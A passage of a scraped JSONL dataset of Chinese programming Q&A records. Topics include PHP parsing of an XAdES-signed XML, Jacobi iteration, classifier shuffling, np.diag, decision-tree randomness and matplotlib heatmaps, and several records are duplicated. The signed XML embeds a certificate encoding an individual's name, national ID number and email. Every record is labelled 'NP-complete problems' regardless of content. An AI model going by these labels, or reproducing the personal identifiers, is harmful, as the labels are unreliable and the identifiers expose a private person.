<ds:X509Certificate>MIIGETCCBPmgAwIBAgIUaQ+g3SS0YfvHQus43mbJ+4FSYegwDQYJKoZIhvcNAQEFBQAwczELMAkGA1UE\nBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNVBAMMG0NP\nUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDYwHhcNMTUxMDA4MTIw\nMDAwWhcNMTYxMDA4MTIwMDAwWjB2MQswCQYDVQQGEwJQTDEbMBkGA1UEBRMSUEVTRUw6IDg2MDYxMzE0\nMzk3MR8wHQYDVQQDDBZLYW1pbCBTZWJhc3RpYW4gTWlqYWN6MRgwFgYDVQQqDA9LYW1pbCBTZWJhc3Rp\nYW4xDzANBgNVBAQMBk1pamFjejCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL4k+zz02Ryt\njonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5bN6qGBQGsmdq\nkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJP8/bo8Coj2EV\ntKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAoLc/CJiNsnsAS\nws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjCFUq+MykmVvfW\n0D0bOTP2X5kCAwEAAaOCApgwggKUMAwGA1UdEwEB/wQCMAAwggFPBgNVHSABAf8EggFDMIIBPzCCATsG\nCSqEaAGG9yMBATCCASwwgd0GCCsGAQUFBwICMIHQDIHNRGVrbGFyYWNqYSB0YSBqZXN0IG/Fm3dpYWRj\nemVuaWVtIHd5ZGF3Y3ksIMW8ZSB0ZW4gY2VydHlmaWthdCB6b3N0YcWCIHd5ZGFueSBqYWtvIGNlcnR5\nZmlrYXQga3dhbGlmaWtvd2FueSB6Z29kbmllIHogd3ltYWdhbmlhbWkgdXN0YXd5IG8gcG9kcGlzaWUg\nZWxla3Ryb25pY3pueW0gb3JheiB0b3dhcnp5c3rEhWN5bWkgamVqIHJvenBvcnrEhWR6ZW5pYW1pLjBK\nBggrBgEFBQcCARY+aHR0cDovL3d3dy5lbGVrdHJvbmljem55cG9kcGlzLnBsL2luZm9ybWFjamUvZG9r\ndW1lbnR5LWktdW1vd3kwCQYDVR0JBAIwADAhBgNVHREEGjAYgRZrYW1pbC5taWphY3pAZ21haWwuY29t\nMA4GA1UdDwEB/wQEAwIGQDCBsAYDVR0jBIGoMIGlgBTMQSp2mC5KehnakTbf2H85P9TCrqF3pHUwczEL\nMAkGA1UEBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNV\nBAMMG0NPUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDaCFH18c1x7\nvNOu01acH+WfGYiAcun0MEAGA1UdHwQ5MDcwNaAzoDGGL2h0dHA6Ly9lbGVrdHJvbmljem55cG9kcGlz\nLnBsL2NybC9jcmxfb3prNTIuY3JsMA0GCSqGSIb3DQEBBQUAA4IBAQAP0zddWprl5hpXiIiMGcC5D7ob\n/nj3wvfOUm0QCf7+ZEorfr6EC96B6F/cNtZ1wXtAQXkf5Zm3gPhbKXY6XWM2NDWadZrDV9zV75Ab06dQ\n5qmDfuMGTfPUdH3+QBmW7YnniWPCGuMzGNlP9DpZ45YrgRnwlsZSHMhX0HiEeDfYKAkGhIaJ7lcPlZrj\nzWBdhUOgYm06pYf8NEKVWzu808iIHIvCBot0ADcZ8ypxDyQsco/RSRGY0EO8FATCH3j2Oe/+7FGRjRQK\nXczBsKu6G8GQ6b/eGuWD7NNAuBX4UJu9jXRo9mzo7zKj01/SPfE4kHTHfHr9yi9BBkzAmaAxQpT5</ds:X509Certificate>\n         </ds:X509Data>\n      </ds:KeyInfo>\n      <ds:Object>\n         <xades:QualifyingProperties xmlns:xades=\"http://uri.etsi.org/01903/v1.3.2#\" Id=\"ID-04b0ddeb-914c-419f-acb2-780dae2ee890\" Target=\"#ID-9a61610b-c8e3-4201-bf41-a174cbc21634\">\n            <xades:SignedProperties Id=\"ID-90b9721b-1d1c-4104-ae2c-ebb6b251cf2b\">\n               <xades:SignedSignatureProperties>\n                  <xades:SigningTime>2015-12-08T13:37:16Z</xades:SigningTime>\n                  <xades:SigningCertificate>\n                     <xades:Cert>\n                        <xades:CertDigest>\n                           <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n                           <ds:DigestValue>+6UE5SSks6Cn6++o8CAkSO/NMWk=</ds:DigestValue>\n                        </xades:CertDigest>\n                        <xades:IssuerSerial>\n                           <ds:X509IssuerName>serialNumber=Nr wpisu: 6,CN=COPE SZAFIR - Kwalifikowany,O=Krajowa Izba Rozliczeniowa S.A.,C=PL</ds:X509IssuerName>\n                           <ds:X509SerialNumber>599792555331422089182929030726347827824527827432</ds:X509SerialNumber>\n                        </xades:IssuerSerial>\n                     </xades:Cert>\n                  </xades:SigningCertificate>\n               </xades:SignedSignatureProperties>\n               <xades:SignedDataObjectProperties>\n                  <xades:DataObjectFormat ObjectReference=\"#ID-e751928b-6823-47ad-a5ae-b7ccdf301751\">\n                     <xades:Description>Dokument w formacie xml [XML]</xades:Description>\n                     <xades:MimeType>text/plain</xades:MimeType>\n                     <xades:Encoding>http://www.w3.org/2000/09/xmldsig#base64</xades:Encoding>\n                  </xades:DataObjectFormat>\n               </xades:SignedDataObjectProperties>\n            </xades:SignedProperties>\n         </xades:QualifyingProperties>\n      </ds:Object>\n      <ds:Object Encoding=\"http://www.w3.org/2000/09/xmldsig#base64\" Id=\"ID-e37958b8-134c-4f51-9b25-8274fd1edce7\" MimeType=\"text/plain\">PFRyZXNjUGlzbWE+DQogIDxTeWduYXR1cmFBa3Q+QUJDWFlaMTIzPC9TeWduYXR1cmFBa3Q+DQogIDxQ\nb2RtaW90eT4NCiAgICA8UG9kbWlvdD4NCiAgICAgIDxPc29iYUZpenljem5hPg0KICAgICAgICA8SW1p\nZT5KYW51c3o8L0ltaWU+DQogICAgICAgIDxOYXp3aXNrbz5Ob3dhazwvTmF6d2lza28+DQogICAgICAg\nIDxPem5hY3plbmllPg0KICAgICAgICAgIDxQZXNlbD44OTEwMDEwMDYxNjwvUGVzZWw+DQogICAgICAg\nIDwvT3puYWN6ZW5pZT4NCiAgICAgIDwvT3NvYmFGaXp5Y3puYT4NCiAgICA8L1BvZG1pb3Q+DQogIDwv\nUG9kbWlvdHk+DQogIDxQb2RzdGF3YVByYXduYT4NCiAgICA8UG9kc3Rhd2E+UFBfMDA0PC9Qb2RzdGF3\nYT4NCiAgPC9Qb2RzdGF3YVByYXduYT4NCjwvVHJlc2NQaXNtYT4=</ds:Object>\n   </ds:Signature>\n</Signatures>\n", "\n\n", "When I load it with simplexml_load_string, var_dump shows:", "\n\n", "object(SimpleXMLElement)#212 (1) {\n  [\"@attributes\"] => array(1) {\n    [\"Id\"] => string(39) \"ID-222cf3cf-0f0b-49d2-b7cb-4cf47bb373cb\"\n  }\n}\n", "\n\n", "There's no nested nodes of \"Signatures\" data.", "\n\n", "However, when I remove \"ds\" namespaces from tags, it works great.", "\n\n", "How can I get them without changing document?", "\n    "]], "Tag": "算法设计"}
{"Answer": "```\r\n# -*- coding: utf-8 -*-\r\n \r\n#Jacobi迭代法 输入系数矩阵mx、值矩阵mr、迭代次数n、误差c(以list模拟矩阵 行优先)\r\n \r\ndef Jacobi(mx,mr,n=100,c=0.0001):\r\n    if len(mx) == len(mr):  #若mx和mr长度相等则开始迭代 否则方程无解\r\n        x = [] #迭代初值 初始化为单行全0矩阵\r\n        for i in range(len(mr)):\r\n            x.append([0])\r\n        count = 0 #迭代次数计数\r\n        while count &lt; n:\r\n            nx = [] #保存单次迭代后的值的集合\r\n            for i in range(len(x)):\r\n                nxi = mr[i][0]\r\n                for j in range(len(mx[i])):\r\n                    if j!=i:\r\n                        nxi = nxi+(-mx[i][j])*x[j][0]\r\n                nxi = nxi/mx[i][i]\r\n                nx.append([nxi]) #迭代计算得到的下一个xi值\r\n            lc = [] #存储两次迭代结果之间的误差的集合\r\n            for i in range(len(x)):\r\n                lc.append(abs(x[i][0]-nx[i][0]))\r\n            if max(lc) &lt; c:\r\n                return nx #当误差满足要求时 返回计算结果\r\n            x = nx\r\n            count = count + 1\r\n        return False #若达到设定的迭代结果仍不满足精度要求 则方程无解\r\n    else:\r\n        return False\r\n \r\n#调用 Jacobi(mx,mr,n=100,c=0.001) 示例\r\nmx = [[8,-3,2],[4,11,-1],[6,3,12]]\r\n \r\nmr = [[20],[33],[36]]\r\nprint(Jacobi(mx,mr,100,0.00001))\r\n\r\n```\r\nhttps://blog.csdn.net/cswfqxs_/article/details/84067711", "Konwledge_Point": "NP完全问题", "Question": ["python 用雅可比方法求解稀疏矩阵，完全不会写，求助a", ["\n\n", "import numpy as np", "\ndef Jacobi(A, b, iter_n, initial_guess=0):", "\n    n = len(A)", "\n\n", "D = np.diag(A)\nR = A - np.diag(D)\nx_i = initial_guess * np.ones(n)\nfor i in range(iter_n):\n    print('x_',i,'=',x_i)\n    x_i = (b - R.dot(x_i)) / D\n\nreturn x_i\n", "\n\n", "def A_ij(n):", "\n   A = np.empty((n, n))", "\n    for i in range(n):", "\n        A[i, i] = 2", "\n    for i in range(n-1):", "\n        A[i,i+1]=A[i+1,i]=1", "\n    return A", "\ndef b_i(n):", "\n    b=np.empty(n)", "\n    b[0]=1", "\n    b[n-1]=-1", "\n    return b", "\ndef x0(n):", "\n    return np.zeros(n)", "\nprint(Jacobi(A,b,100,x0))"]], "Tag": "算法设计"}
{"Answer": "```\r\n# -*- coding: utf-8 -*-\r\n \r\n#Jacobi迭代法 输入系数矩阵mx、值矩阵mr、迭代次数n、误差c(以list模拟矩阵 行优先)\r\n \r\ndef Jacobi(mx,mr,n=100,c=0.0001):\r\n    if len(mx) == len(mr):  #若mx和mr长度相等则开始迭代 否则方程无解\r\n        x = [] #迭代初值 初始化为单行全0矩阵\r\n        for i in range(len(mr)):\r\n            x.append([0])\r\n        count = 0 #迭代次数计数\r\n        while count &lt; n:\r\n            nx = [] #保存单次迭代后的值的集合\r\n            for i in range(len(x)):\r\n                nxi = mr[i][0]\r\n                for j in range(len(mx[i])):\r\n                    if j!=i:\r\n                        nxi = nxi+(-mx[i][j])*x[j][0]\r\n                nxi = nxi/mx[i][i]\r\n                nx.append([nxi]) #迭代计算得到的下一个xi值\r\n            lc = [] #存储两次迭代结果之间的误差的集合\r\n            for i in range(len(x)):\r\n                lc.append(abs(x[i][0]-nx[i][0]))\r\n            if max(lc) &lt; c:\r\n                return nx #当误差满足要求时 返回计算结果\r\n            x = nx\r\n            count = count + 1\r\n        return False #若达到设定的迭代结果仍不满足精度要求 则方程无解\r\n    else:\r\n        return False\r\n \r\n#调用 Jacobi(mx,mr,n=100,c=0.001) 示例\r\nmx = [[8,-3,2],[4,11,-1],[6,3,12]]\r\n \r\nmr = [[20],[33],[36]]\r\nprint(Jacobi(mx,mr,100,0.00001))\r\n\r\n```\r\nhttps://blog.csdn.net/cswfqxs_/article/details/84067711", "Konwledge_Point": "NP完全问题", "Question": ["python 用雅可比方法求解稀疏矩阵，完全不会写，求助a", ["\n\n", "import numpy as np", "\ndef Jacobi(A, b, iter_n, initial_guess=0):", "\n    n = len(A)", "\n\n", "D = np.diag(A)\nR = A - np.diag(D)\nx_i = initial_guess * np.ones(n)\nfor i in range(iter_n):\n    print('x_',i,'=',x_i)\n    x_i = (b - R.dot(x_i)) / D\n\nreturn x_i\n", "\n\n", "def A_ij(n):", "\n   A = np.empty((n, n))", "\n    for i in range(n):", "\n        A[i, i] = 2", "\n    for i in range(n-1):", "\n        A[i,i+1]=A[i+1,i]=1", "\n    return A", "\ndef b_i(n):", "\n    b=np.empty(n)", "\n    b[0]=1", "\n    b[n-1]=-1", "\n    return b", "\ndef x0(n):", "\n    return np.zeros(n)", "\nprint(Jacobi(A,b,100,x0))"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;我先确认个问题哈&amp;#xff0c;train的行现在的物理含义是什么&amp;#xff1f;一般来说&amp;#xff0c;行代表样本&amp;#xff0c;列表示特征。但如果是这样的话就是不对的&amp;#xff0c;对样本的顺序进行打乱以后并不会改变分类器的效果&amp;#xff0c;这个是需要对列的顺序进行打乱。比如昨天帖子里的from skmultilearn.problem_transform import ClassifierChain&amp;#xff0c;本质上是先根据x预测y1&amp;#xff0c;然后再根据x、y1预测y2&amp;#xff0c;以此类推&amp;#xff0c;所以需要对y的顺序进行重排。所以您先确认一下行与列的物理含义对不对&amp;#xff0c;如果是对的话&amp;#xff0c;我再看看别的问题。&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attr\"&gt;row_rand&lt;/span&gt; &amp;#61; np.random.permutation(train)  &lt;span class=\"hljs-comment\"&gt;# 打乱数据顺序&amp;#xff08;使链排序为随机&amp;#xff09;&lt;/span&gt;\n&lt;span class=\"hljs-attr\"&gt;row_rand_data&lt;/span&gt; &amp;#61; row_rand[..., &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:&lt;span class=\"hljs-number\"&gt;74&lt;/span&gt;]\n&lt;span class=\"hljs-attr\"&gt;row_rand_label&lt;/span&gt; &amp;#61; row_rand[..., &lt;span class=\"hljs-number\"&gt;74&lt;/span&gt;:&lt;span class=\"hljs-number\"&gt;134&lt;/span&gt;]\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "NP完全问题", "Question": ["多标签分类模型循环问题", ["问题遇到的现象和发生背景", "\n", "循环训练模型。我在循环训练模型的时候，随机打乱了训练数据，最后得到的结果都是一样的。我尝试单独运行5和10迭代次数，结果不一样。按理来说循环结果应该是不一样的，但是出现了结果完全相同的结果。", "\n", "问题相关代码，请勿粘贴截图", "\n", "\n", "\n", "# 随机选取训练集，并训练模型，并得到各个模型预测结果", "\ndef train_m(m):\n    ", "\"\"", "\"\n    :param m: 设置模型数目\n    :return: 返回m个模型\n    \"", "\"\"", "\n    ", "model", " = {}  ", "# 设置空的字典，用以存储模型或预测结果", "\n    ", "pred", " = {}\n    ", "i", " = ", "0", "\n    while i < m:\n        ", "row_rand", " = np.random.permutation(train)  ", "# 打乱数据顺序（使链排序为随机）", "\n        ", "row_rand_data", " = row_rand[..., ", "0", ":", "74", "]\n        ", "row_rand_label", " = row_rand[..., ", "74", ":", "134", "]\n\n        ", "# 训练模型，将所有模型存储在字典中", "\n        ", "clf", " = ClassifierChain(LGBMClassifier())\n        ", "clf_i", " = clf.fit(row_rand_data, row_rand_label)\n        ", "clf_i_copy", " = copy.copy(clf_i)\n        model['%s'%i] = clf_i_copy\n\n        ", "# 预测，将所有预测结果存储在字典中，并将结果转换为数组toarray()", "\n        ", "pred_i", " = clf_i.predict(test_data).toarray()\n        ", "pred_i_copy", " = copy.copy(pred_i)\n        pred['%s'%i] = pred_i_copy\n\n        ", "i", " = i + ", "1", "\n\n    return model, pred\n\n", "# 计算权重，得到最终预测结果", "\ndef w_pred_get(prediction_all, ft):\n    ", "w", " = prediction_all['", "0", "']\n    ", "num", " = ", "0", "\n    ", "i", " = ", "j", " = ", "0", "\n    ", "# 统计预测标签数目", "\n    while i < np.shape(prediction_all['", "0", "'])[", "0", "]:\n        while j < np.shape(prediction_all['", "0", "'])[", "1", "]:\n            for value ", "in", " prediction_all.values():\n                ", "if", " value[i, j] == ", "1", ":\n                    ", "num", " = num + ", "1", "\n            w[i, j] = num\n            ", "num", " = ", "0", "\n            ", "j", " = j + ", "1", "\n        ", "j", " = ", "0", "\n        ", "i", " = i + ", "1", "\n    ", "w", " = w/len(prediction_all) ", "# 得到权值", "\n\n    ", "# 设置阈值ft，得到最终预测结果", "\n    ", "condition", " = w < ft\n    ", "condition2", " = w >= ft\n    ", "prediction", " = np.where(condition, w, ", "1", ")\n    ", "prediction", " = np.where(condition2, prediction, ", "0", ")\n\n    return prediction, w\n\n\n", "# 查看不同迭代次数对于acc的影响，并进行可视化", "\nfor t ", "in", " np.arange(", "5", ", ", "20", ", ", "5", "):\n    model_it, ", "pred_it", " = train_m(t)\n    pred_w, ", "w", " = w_pred_get(pred_it, ", "0.5", ")\n    ", "Subset_Accuracy", " = accuracy_score(pred_w, test_label)\n    print(t, Subset_Accuracy)\n    ", "t", " = t + ", "5", "\n\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;我先确认个问题哈&amp;#xff0c;train的行现在的物理含义是什么&amp;#xff1f;一般来说&amp;#xff0c;行代表样本&amp;#xff0c;列表示特征。但如果是这样的话就是不对的&amp;#xff0c;对样本的顺序进行打乱以后并不会改变分类器的效果&amp;#xff0c;这个是需要对列的顺序进行打乱。比如昨天帖子里的from skmultilearn.problem_transform import ClassifierChain&amp;#xff0c;本质上是先根据x预测y1&amp;#xff0c;然后再根据x、y1预测y2&amp;#xff0c;以此类推&amp;#xff0c;所以需要对y的顺序进行重排。所以您先确认一下行与列的物理含义对不对&amp;#xff0c;如果是对的话&amp;#xff0c;我再看看别的问题。&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attr\"&gt;row_rand&lt;/span&gt; &amp;#61; np.random.permutation(train)  &lt;span class=\"hljs-comment\"&gt;# 打乱数据顺序&amp;#xff08;使链排序为随机&amp;#xff09;&lt;/span&gt;\n&lt;span class=\"hljs-attr\"&gt;row_rand_data&lt;/span&gt; &amp;#61; row_rand[..., &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:&lt;span class=\"hljs-number\"&gt;74&lt;/span&gt;]\n&lt;span class=\"hljs-attr\"&gt;row_rand_label&lt;/span&gt; &amp;#61; row_rand[..., &lt;span class=\"hljs-number\"&gt;74&lt;/span&gt;:&lt;span class=\"hljs-number\"&gt;134&lt;/span&gt;]\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "NP完全问题", "Question": ["多标签分类模型循环问题", ["问题遇到的现象和发生背景", "\n", "循环训练模型。我在循环训练模型的时候，随机打乱了训练数据，最后得到的结果都是一样的。我尝试单独运行5和10迭代次数，结果不一样。按理来说循环结果应该是不一样的，但是出现了结果完全相同的结果。", "\n", "问题相关代码，请勿粘贴截图", "\n", "\n", "\n", "# 随机选取训练集，并训练模型，并得到各个模型预测结果", "\ndef train_m(m):\n    ", "\"\"", "\"\n    :param m: 设置模型数目\n    :return: 返回m个模型\n    \"", "\"\"", "\n    ", "model", " = {}  ", "# 设置空的字典，用以存储模型或预测结果", "\n    ", "pred", " = {}\n    ", "i", " = ", "0", "\n    while i < m:\n        ", "row_rand", " = np.random.permutation(train)  ", "# 打乱数据顺序（使链排序为随机）", "\n        ", "row_rand_data", " = row_rand[..., ", "0", ":", "74", "]\n        ", "row_rand_label", " = row_rand[..., ", "74", ":", "134", "]\n\n        ", "# 训练模型，将所有模型存储在字典中", "\n        ", "clf", " = ClassifierChain(LGBMClassifier())\n        ", "clf_i", " = clf.fit(row_rand_data, row_rand_label)\n        ", "clf_i_copy", " = copy.copy(clf_i)\n        model['%s'%i] = clf_i_copy\n\n        ", "# 预测，将所有预测结果存储在字典中，并将结果转换为数组toarray()", "\n        ", "pred_i", " = clf_i.predict(test_data).toarray()\n        ", "pred_i_copy", " = copy.copy(pred_i)\n        pred['%s'%i] = pred_i_copy\n\n        ", "i", " = i + ", "1", "\n\n    return model, pred\n\n", "# 计算权重，得到最终预测结果", "\ndef w_pred_get(prediction_all, ft):\n    ", "w", " = prediction_all['", "0", "']\n    ", "num", " = ", "0", "\n    ", "i", " = ", "j", " = ", "0", "\n    ", "# 统计预测标签数目", "\n    while i < np.shape(prediction_all['", "0", "'])[", "0", "]:\n        while j < np.shape(prediction_all['", "0", "'])[", "1", "]:\n            for value ", "in", " prediction_all.values():\n                ", "if", " value[i, j] == ", "1", ":\n                    ", "num", " = num + ", "1", "\n            w[i, j] = num\n            ", "num", " = ", "0", "\n            ", "j", " = j + ", "1", "\n        ", "j", " = ", "0", "\n        ", "i", " = i + ", "1", "\n    ", "w", " = w/len(prediction_all) ", "# 得到权值", "\n\n    ", "# 设置阈值ft，得到最终预测结果", "\n    ", "condition", " = w < ft\n    ", "condition2", " = w >= ft\n    ", "prediction", " = np.where(condition, w, ", "1", ")\n    ", "prediction", " = np.where(condition2, prediction, ", "0", ")\n\n    return prediction, w\n\n\n", "# 查看不同迭代次数对于acc的影响，并进行可视化", "\nfor t ", "in", " np.arange(", "5", ", ", "20", ", ", "5", "):\n    model_it, ", "pred_it", " = train_m(t)\n    pred_w, ", "w", " = w_pred_get(pred_it, ", "0.5", ")\n    ", "Subset_Accuracy", " = accuracy_score(pred_w, test_label)\n    print(t, Subset_Accuracy)\n    ", "t", " = t + ", "5", "\n\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;你好&amp;#xff0c;请使用&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-attribute\"&gt;b&lt;/span&gt; &lt;span class=\"hljs-operator\"&gt;&amp;#61;&lt;/span&gt; np.diag(a)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;b即是你需要的&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["对于一个4*4的数组，如何提取对角线的数据并组成一维数组？", ["问题：有一个4行4列的数组（比如：np.random.randint(0,10,size=(4,4))），请将其中对角线的数取出来形成一个一维数组。提示（使用np.eye）。", "思路：我只会一个一个数据定位，可以用for循环，然后创建一个空列表，再一个个用append() 添加进去。", "如何用np.eye()解答，完全没有思路。请求有经验的tutor指导。谢谢！", "\n", "P.S. 麻烦最好能留下代码，方便阅读"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;你好&amp;#xff0c;请使用&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-attribute\"&gt;b&lt;/span&gt; &lt;span class=\"hljs-operator\"&gt;&amp;#61;&lt;/span&gt; np.diag(a)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;b即是你需要的&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["对于一个4*4的数组，如何提取对角线的数据并组成一维数组？", ["问题：有一个4行4列的数组（比如：np.random.randint(0,10,size=(4,4))），请将其中对角线的数取出来形成一个一维数组。提示（使用np.eye）。", "思路：我只会一个一个数据定位，可以用for循环，然后创建一个空列表，再一个个用append() 添加进去。", "如何用np.eye()解答，完全没有思路。请求有经验的tutor指导。谢谢！", "\n", "P.S. 麻烦最好能留下代码，方便阅读"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;sklearn.tree.DecisionTreeClassifier()在进行分支的时候特征选择是随机的&amp;#xff0c;即使是splitter&amp;#61;”best”的时候。打印dt_clf.feature_importances_的话就会看到有两种不同的结果&amp;#xff0c;对应两种决策边界。sklearn.tree.DecisionTreeClassifier的函数说明中明确说&amp;#xff1a;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;strong&gt;random_state&amp;#xff1a;int, RandomState instance or None, default&amp;#61;None&lt;/strong&gt;&lt;br /&gt;Controls the randomness of the estimator. &lt;strong&gt;The features are always randomly permuted at each split, even if splitter is set to &amp;#34;best&amp;#34;.&lt;/strong&gt; When max_features &amp;lt; n_features, the algorithm will select max_features at random at each split before finding the best split among them. But the best found split may vary across different runs, even if max_features&amp;#61;n_features. That is the case, if the improvement of the criterion is identical for several splits and one split has to be selected at random. To obtain a deterministic behaviour during fitting, random_state has to be fixed to an integer. See Glossary for details.&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "NP完全问题", "Question": ["机器学习决策树鸢尾花数据集，绘制决策边界，出现相同代码相同数据多次运行，结果不一致的问题", ["练习机器学习中，采用决策树将鸢尾花的数据进行分类，并绘制决策边界，代码如下：", "\n", "import", " numpy as np\n", "import", " matplotlib.pyplot as plt\nfrom sklearn ", "import", " datasets\n", "iris", " = datasets.load_iris()\n", "x", " = iris.data[:,", "2", ":]\n", "y", " = iris.target\nfrom sklearn.tree ", "import", " DecisionTreeClassifier\n", "dt_clf", " = DecisionTreeClassifier(", "max_depth", " = ", "2", ",", "criterion", " = 'entropy')\ndt_clf.fit(x,y)\n\ndef plot_decision_boundary(model,axis):\n    x0,", "x1", " = np.meshgrid(\n        np.linspace(axis[", "0", "],axis[", "1", "],int((axis[", "1", "]-axis[", "0", "])*", "200", ")),\n        np.linspace(axis[", "2", "],axis[", "3", "],int((axis[", "3", "]-axis[", "2", "])*", "200", "))\n    )\n    \n    ", "x_new", " = np.c_[x0.ravel(),x1.ravel()]\n    ", "y_predict", " = model.predict(x_new)\n    ", "zz", " = y_predict.reshape(x0.shape)\n    \n    from matplotlib.colors ", "import", " ListedColormap\n    ", "custom_cmap", " = ListedColormap(['", "#EF9A9A','#FFF59D','#90CAF9'])", "\n    plt.contourf(x0,x1,zz,", "cmap", " = custom_cmap)\n\nplot_decision_boundary(dt_clf,", "axis=", " [", "0.5", ",", "7.5", ",", "0", ",", "3", "])\nplt.scatter(x[", "y==0,0],x[y==0,1])", "\nplt.scatter(x[", "y==1,0],x[y==1,1])", "\nplt.scatter(x[", "y==2,0],x[y==2,1])", "\nplt.show() ", "# 这个结果有点不对 ，但我又不知道哪里搞错了", "\n", "\n", "第一次运行出现了下图所示的分类结果：", "\n", "第二次及以后运行时出现了下图的分类结果：", "\n", "我想知道明明是相同的数据，相同的代码，只是运行先后顺序不同，为什么会出现上下两个图之间的完全不同的分类结果，并且出现哪种分类结果还有一定的随机性？我的代码里也没有随机数。虽然非参数学习对于数据依赖非常严重，但是我的数据也没有发生更改啊，很奇怪。"]], "Tag": "算法设计"}
{"Answer": "import numpy as np\r\nimport matplotlib.pyplot as plt\r\n\r\nx = np.random.rand(100).reshape(10,10)\r\nplt.xticks(np.arange(10)+0.5,['x','y','z','h','j','k','t','f','q','p'])\r\nplt.yticks(np.arange(10)+0.5,['x','y','z','h','j','k','t','f','q','p'])\r\nplt.imshow(x, cmap=plt.cm.hot, vmin=0, vmax=1)\r\nplt.title('color-fast')\r\nplt.colorbar()\r\nplt.show()", "Konwledge_Point": "NP完全问题", "Question": ["如何使用matplotlib生成如下热力图", ["\n如上图，要求有标题，横纵坐标都为字母，右边有热力图图例，总之越像越好。最好标题和横纵坐标都和上图一致，中间的数据以列表形式给出，代码中多加点注释，我好理解一点。本人新手，以前没接触过绘图，知道很麻烦各位大神，请大神见谅。谢谢！", "\n其实关于matplotlib生成热力图的问题我也看过不少，但好像没有完全能用的。我看到有个相似的代码如下，但缺少右边的colorbar，请问大神如何修改代码添加colorbar？：", "\nimport matplotlib.pyplot as plt", "\nimport numpy as np", "\ncolumn_labels = list('ABCD')", "\nrow_labels = list('WXYZ')", "\ndata = np.random.rand(4,4)", "\nfig, ax = plt.subplots()", "\nheatmap = ax.pcolor(data, cmap=plt.cm.Blues)", "\n\n", "ax.set_xticks(np.arange(data.shape[0])+0.5, minor=False)", "\nax.set_yticks(np.arange(data.shape[1])+0.5, minor=False)", "\n\n", "ax.invert_yaxis()", "\nax.xaxis.tick_top()", "\n\n", "ax.set_xticklabels(row_labels, minor=False)", "\nax.set_yticklabels(column_labels, minor=False)", "\n\n", "plt.show()"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;sklearn.tree.DecisionTreeClassifier()在进行分支的时候特征选择是随机的&amp;#xff0c;即使是splitter&amp;#61;”best”的时候。打印dt_clf.feature_importances_的话就会看到有两种不同的结果&amp;#xff0c;对应两种决策边界。sklearn.tree.DecisionTreeClassifier的函数说明中明确说&amp;#xff1a;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;strong&gt;random_state&amp;#xff1a;int, RandomState instance or None, default&amp;#61;None&lt;/strong&gt;&lt;br /&gt;Controls the randomness of the estimator. &lt;strong&gt;The features are always randomly permuted at each split, even if splitter is set to &amp;#34;best&amp;#34;.&lt;/strong&gt; When max_features &amp;lt; n_features, the algorithm will select max_features at random at each split before finding the best split among them. But the best found split may vary across different runs, even if max_features&amp;#61;n_features. That is the case, if the improvement of the criterion is identical for several splits and one split has to be selected at random. To obtain a deterministic behaviour during fitting, random_state has to be fixed to an integer. See Glossary for details.&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "NP完全问题", "Question": ["机器学习决策树鸢尾花数据集，绘制决策边界，出现相同代码相同数据多次运行，结果不一致的问题", ["练习机器学习中，采用决策树将鸢尾花的数据进行分类，并绘制决策边界，代码如下：", "\n", "import", " numpy as np\n", "import", " matplotlib.pyplot as plt\nfrom sklearn ", "import", " datasets\n", "iris", " = datasets.load_iris()\n", "x", " = iris.data[:,", "2", ":]\n", "y", " = iris.target\nfrom sklearn.tree ", "import", " DecisionTreeClassifier\n", "dt_clf", " = DecisionTreeClassifier(", "max_depth", " = ", "2", ",", "criterion", " = 'entropy')\ndt_clf.fit(x,y)\n\ndef plot_decision_boundary(model,axis):\n    x0,", "x1", " = np.meshgrid(\n        np.linspace(axis[", "0", "],axis[", "1", "],int((axis[", "1", "]-axis[", "0", "])*", "200", ")),\n        np.linspace(axis[", "2", "],axis[", "3", "],int((axis[", "3", "]-axis[", "2", "])*", "200", "))\n    )\n    \n    ", "x_new", " = np.c_[x0.ravel(),x1.ravel()]\n    ", "y_predict", " = model.predict(x_new)\n    ", "zz", " = y_predict.reshape(x0.shape)\n    \n    